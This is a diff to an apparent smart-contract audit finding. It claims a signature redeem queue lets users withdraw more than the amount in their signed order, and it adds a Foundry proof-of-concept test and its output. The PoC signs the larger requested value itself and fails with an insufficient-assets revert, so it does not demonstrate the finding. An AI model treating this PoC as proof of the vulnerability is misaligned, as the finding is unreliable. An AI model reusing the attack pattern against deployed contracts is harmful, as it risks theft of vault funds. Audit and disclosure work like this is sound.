@@ -43,8 +43,8 @@ A user has to get signed ordered amount first and then calls `redeem()` with a `
 
 ### Attacker Path
 1. A user got a valid signed order for `1,000`.
-2. And then modifies requested amount to `10,000` even though, the signed ordered is `1000`.
-3. And the user calls `redeem()` with valid signatures and redemption succeeds as long as vault has >= 10,000 in liquid assets.
+2. And then modifies requested amount to `1,010` even though the signed ordered is `1000`.
+3. And the user calls `redeem()` with valid signatures and redemption succeeds as long as vault has >= 1,010 in liquid assets.
 
 
 ### Impact:
@@ -53,8 +53,132 @@ This vulnerability allows a user to redeem more assets than they are allowed to 
 
 ### Proof of concept:
 ```solidity
+// SPDX-License-Identifier: BUSL-1.1
+pragma solidity 0.8.25;
 
+import "../../Fixture.t.sol";
+import "../../Imports.sol";
+import "forge-std/console.sol";
+
+contract SignatureRedeemQueueTest is FixtureTest {
+    address vaultAdmin = vm.createWallet("vaultAdmin").addr;
+    address vaultProxyAdmin = vm.createWallet("vaultProxyAdmin").addr;
+    address user = vm.createWallet("user").addr;
+    address asset;
+    address[] assetsDefault;
+
+    function setUp() external {
+        asset = address(new MockERC20());
+        assetsDefault.push(asset);
+    }
+
+    function testRedeem() external {
+        Deployment memory deployment = createVault(vaultAdmin, vaultProxyAdmin, assetsDefault);
+
+        uint256 signerPk = uint256(keccak256("signer"));
+        address signer = vm.addr(signerPk);
+        address[] memory signers = new address[](1);
+        signers[0] = signer;
+        (Consensus consensus,) = createConsensus(deployment, signers);
+        SignatureRedeemQueue queue =
+            SignatureRedeemQueue(addSignatureRedeemQueue(deployment, vaultProxyAdmin, asset, address(consensus)));
+
+        uint256 amount = 1000;
+        uint256 requested = 1000 + 10;
+
+        ISignatureQueue.Order memory order = ISignatureQueue.Order({
+            orderId: 1,
+            queue: address(queue),
+            asset: asset,
+            caller: user,
+            recipient: user,
+            ordered: amount,
+            requested: requested,
+            deadline: block.timestamp + 1 days,
+            nonce: 0
+        });
+        IConsensus.Signature[] memory signatures = new IConsensus.Signature[](1);
+        signatures[0] = signOrder(queue, order, signerPk);
+        {
+            Oracle oracle = deployment.oracle;
+            IOracle.Report[] memory reports = new IOracle.Report[](1);
+            uint224 price = 1e18;
+            reports[0] = IOracle.Report({asset: asset, priceD18: price});
+            vm.startPrank(vaultAdmin);
+            oracle.submitReports(reports);
+            oracle.acceptReport(asset, price, uint32(block.timestamp));
+            vm.stopPrank();
+        }
+
+        vm.prank(address(queue));
+        deployment.shareManager.mint(user, amount);
+        MockERC20(asset).mint(address(deployment.vault), amount);
+        
+        console.log("Vault token balance:", MockERC20(asset).balanceOf(address(deployment.vault)));
+        console.log("Requested:", order.requested);
+        console.log("Ordered:", order.ordered);
+
+        vm.prank(user);
+        queue.redeem(order, signatures);
+
+        assertEq(MockERC20(asset).balanceOf(user), requested, "User should receive assets");
+    }
+
+    function signOrder(SignatureQueue queue, ISignatureQueue.Order memory order, uint256 pk)
+        internal
+        view
+        returns (IConsensus.Signature memory)
+    {
+        bytes32 hash = queue.hashOrder(order);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);
+        return IConsensus.Signature({signer: vm.addr(pk), signature: abi.encodePacked(r, s, v)});
+    }
+}
 ```
+
+
+Run test with
+```bash
+forge test --fork-url $(grep ETH_RPC .env | cut -d '=' -f2) --gas-limit 10000000000000000 --fork-block-number 22730425 -vvv --match-path './test/unit/queues/SignatureRedeemQueueTest.t.sol'
+```
+
+Test Output
+```bash
+$ forge test --fork-url $(grep ETH_RPC .env | cut -d '=' -f2) --gas-limit 10000000000000000 --fork-block-number 22730425 -vvv --match-path './test/unit/queues/SignatureRedeemQueueTest.t.sol'
+[⠘] Compiling...
+[⠑] Compiling 1 files with Solc 0.8.25
+[⠃] Solc 0.8.25 finished in 49.63s
+Compiler run successful!
+
+Ran 2 tests for test/unit/queues/SignatureRedeemQueueTest.t.sol:SignatureRedeemQueueTest
+[PASS] test() (gas: 185)
+[FAIL: InsufficientAssets(1010, 1000)] testRedeem() (gas: 39807988)
+Logs:
+  Vault token balance: 1000
+  Requested: 1010
+  Ordered: 1000
+
+Traces:
+  [39807988] SignatureRedeemQueueTest::testRedeem()
+
+                               ...
+
+│   │   └─ ← [Revert] InsufficientAssets(1010, 1000)
+    │   └─ ← [Revert] InsufficientAssets(1010, 1000)
+    └─ ← [Revert] InsufficientAssets(1010, 1000)
+
+Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 39.77ms (31.57ms CPU time)
+
+Ran 1 test suite in 4.12s (39.77ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/unit/queues/SignatureRedeemQueueTest.t.sol:SignatureRedeemQueueTest
+[FAIL: InsufficientAssets(1010, 1000)] testRedeem() (gas: 39807988)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
+```
+
+
 
 ### Recommendation:
 ```solidity
